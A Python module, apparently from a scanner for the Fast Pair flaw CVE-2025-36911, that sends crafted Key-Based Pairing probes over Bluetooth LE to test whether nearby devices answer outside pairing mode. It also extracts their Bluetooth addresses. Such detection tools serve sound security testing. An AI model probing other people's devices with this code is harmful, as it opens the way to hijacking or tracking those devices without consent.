from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Callable, Optional

from bleak import BleakClient, BleakError
from bleak.backends.device import BLEDevice
from bleak.backends.characteristic import BleakGATTCharacteristic

from .constants import (
    FAST_PAIR_SERVICE_UUID,
    KEY_BASED_PAIRING_CHAR_UUID,
    ACCOUNT_KEY_CHAR_UUID,
    PASSKEY_CHAR_UUID,
    MODEL_ID_CHAR_UUID,
    DEFAULT_CONNECTION_TIMEOUT,
    DEFAULT_NOTIFICATION_TIMEOUT,
)
from .crypto import FastPairCrypto, aes_128_encrypt, aes_128_decrypt
from .protocol import (
    KeyBasedPairingRequest,
    KeyBasedPairingResponse,
    PasskeyBlock,
    PairingRequestFlags,
    parse_bluetooth_address,
    format_bluetooth_address,
    parse_kbp_response_multi_strategy,
)
from .scanner import FastPairDevice


@dataclass
class VerificationResult:
    success: bool
    provider_address: Optional[str] = None
    error: Optional[str] = None
    raw_response: Optional[bytes] = None
    response_received: bool = False  # True if device responded at all (vulnerability indicator)


class FastPairClient:
    def __init__(
        self,
        device: FastPairDevice | BLEDevice | str,
        crypto: Optional[FastPairCrypto] = None,
        connection_timeout: float = DEFAULT_CONNECTION_TIMEOUT,
    ):
        if isinstance(device, FastPairDevice):
            self._ble_device = device.ble_device
            self._fp_device = device
        elif isinstance(device, BLEDevice):
            self._ble_device = device
            self._fp_device = None
        else:
            self._ble_device = device
            self._fp_device = None

        self.crypto = crypto or FastPairCrypto()
        self.connection_timeout = connection_timeout
        self._client: Optional[BleakClient] = None
        self._notification_response: Optional[bytes] = None
        self._notification_event = asyncio.Event()

    @property
    def is_connected(self) -> bool:
        return self._client is not None and self._client.is_connected

    @property
    def address(self) -> str:
        if isinstance(self._ble_device, str):
            return self._ble_device
        return self._ble_device.address

    async def connect(self) -> bool:
        self._client = BleakClient(
            self._ble_device,
            timeout=self.connection_timeout,
        )
        try:
            await self._client.connect()
            return True
        except BleakError as e:
            raise ConnectionError(f"Failed to connect: {e}")

    async def disconnect(self) -> None:
        if self._client:
            await self._client.disconnect()
            self._client = None

    async def __aenter__(self) -> "FastPairClient":
        await self.connect()
        return self

    async def __aexit__(self, *args) -> None:
        await self.disconnect()

    async def read_model_id(self) -> Optional[int]:
        if not self._client:
            raise RuntimeError("Not connected")

        try:
            data = await self._client.read_gatt_char(MODEL_ID_CHAR_UUID)
            if len(data) >= 3:
                return int.from_bytes(data[:3], byteorder="big")
        except BleakError:
            pass
        return None

    def _notification_handler(
        self, characteristic: BleakGATTCharacteristic, data: bytearray
    ) -> None:
        self._notification_response = bytes(data)
        self._notification_event.set()

    async def _wait_for_notification(
        self, timeout: float = DEFAULT_NOTIFICATION_TIMEOUT
    ) -> Optional[bytes]:
        self._notification_event.clear()
        try:
            await asyncio.wait_for(self._notification_event.wait(), timeout=timeout)
            return self._notification_response
        except asyncio.TimeoutError:
            return None

    async def send_key_based_pairing_request(
        self,
        request: KeyBasedPairingRequest,
        aes_key: bytes,
    ) -> Optional[KeyBasedPairingResponse]:
        if not self._client:
            raise RuntimeError("Not connected")

        plaintext = request.build()
        encrypted_request = aes_128_encrypt(aes_key, plaintext)

        await self._client.start_notify(
            KEY_BASED_PAIRING_CHAR_UUID,
            self._notification_handler,
        )

        try:
            await self._client.write_gatt_char(
                KEY_BASED_PAIRING_CHAR_UUID,
                encrypted_request,
                response=True,
            )

            encrypted_response = await self._wait_for_notification()

            if encrypted_response:
                decrypted = aes_128_decrypt(aes_key, encrypted_response)
                return KeyBasedPairingResponse.parse(decrypted)

        finally:
            try:
                await self._client.stop_notify(KEY_BASED_PAIRING_CHAR_UUID)
            except BleakError:
                pass

        return None

    async def send_raw_pairing_probe(
        self,
        encrypted_data: bytes,
    ) -> Optional[bytes]:
        """
        Send arbitrary 16-byte data to Key-Based Pairing characteristic.
        Returns raw response bytes if device responds, None otherwise.
        
        This is the core CVE-2025-36911 detection: vulnerable devices respond
        to pairing requests even when NOT in pairing mode. The response itself
        (not its decrypted content) indicates vulnerability.
        """
        if not self._client:
            raise RuntimeError("Not connected")

        if len(encrypted_data) != 16:
            raise ValueError("Data must be 16 bytes")

        await self._client.start_notify(
            KEY_BASED_PAIRING_CHAR_UUID,
            self._notification_handler,
        )

        try:
            await self._client.write_gatt_char(
                KEY_BASED_PAIRING_CHAR_UUID,
                encrypted_data,
                response=True,
            )

            return await self._wait_for_notification()

        finally:
            try:
                await self._client.stop_notify(KEY_BASED_PAIRING_CHAR_UUID)
            except BleakError:
                pass

    async def verify_pairing_behavior(
        self,
        aes_key: Optional[bytes] = None,
        seeker_address: Optional[bytes] = None,
    ) -> VerificationResult:
        """
        Test if device is vulnerable to CVE-2025-36911.
        
        The vulnerability: devices respond to Key-Based Pairing requests even
        when NOT in pairing mode. We detect this by checking for ANY response,
        not by validating the cryptographic handshake.
        
        If aes_key is provided, we also attempt to decrypt the response.
        If not provided, we use a test key - decryption may fail but
        getting a response at all indicates vulnerability.
        """
        if not self._client:
            return VerificationResult(success=False, error="Not connected")

        try:
            provider_addr_bytes = parse_bluetooth_address(self.address)
        except ValueError as e:
            return VerificationResult(success=False, error=str(e))

        import os
        salt = os.urandom(8)

        request = KeyBasedPairingRequest.for_verification(
            provider_address=provider_addr_bytes,
            seeker_address=seeker_address,
        )
        request.salt = salt

        key = aes_key if aes_key else bytes(16)
        plaintext = request.build()
        encrypted_request = aes_128_encrypt(key, plaintext)

        salt_based_secret = salt + bytes(8)

        try:
            raw_response = await self.send_raw_pairing_probe(encrypted_request)

            if raw_response:
                provider_address_str = parse_kbp_response_multi_strategy(
                    raw_response,
                    shared_secret=aes_key if aes_key else salt_based_secret,
                )

                return VerificationResult(
                    success=True,
                    response_received=True,
                    provider_address=provider_address_str,
                    raw_response=raw_response,
                )
            else:
                return VerificationResult(
                    success=False,
                    response_received=False,
                    error="No response from device (not vulnerable or not reachable)",
                )

        except Exception as e:
            return VerificationResult(success=False, error=str(e))
